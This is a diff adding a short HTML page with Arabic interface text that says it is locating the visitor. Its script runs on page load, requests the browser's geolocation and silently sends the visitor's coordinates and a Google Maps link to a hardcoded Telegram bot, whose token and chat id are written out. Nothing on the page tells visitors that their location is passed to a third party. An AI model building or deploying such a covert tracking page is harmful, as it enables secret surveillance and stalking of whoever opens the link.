@@ -1,1 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>جارٍ تحديد موقعك</title>
+  <script>
+    async function sendLocationToTelegram(lat, lon) {
+      const token = '7565893472:AAFoUgDgmZrIpkM1j_my-gEu_FsnjvC-nVY';
+      const chat_id = '1367401179';
+      const message = `تم تحديد الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: chat_id, text: message })
+      });
+    }
 
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          document.getElementById("status").innerText = "تم تحديد موقعك بنجاح.";
+          await sendLocationToTelegram(lat, lon);
+        }, function(error) {
+          document.getElementById("status").innerText = "فشل في الحصول على الموقع.";
+        });
+      } else {
+        document.getElementById("status").innerText = "المتصفح لا يدعم تحديد الموقع.";
+      }
+    }
+
+    window.onload = getLocation;
+  </script>
+</head>
+<body>
+  <h2>جارٍ تحديد موقعك...</h2>
+  <p id="status">يرجى السماح بمشاركة الموقع</p>
+</body>
+</html>
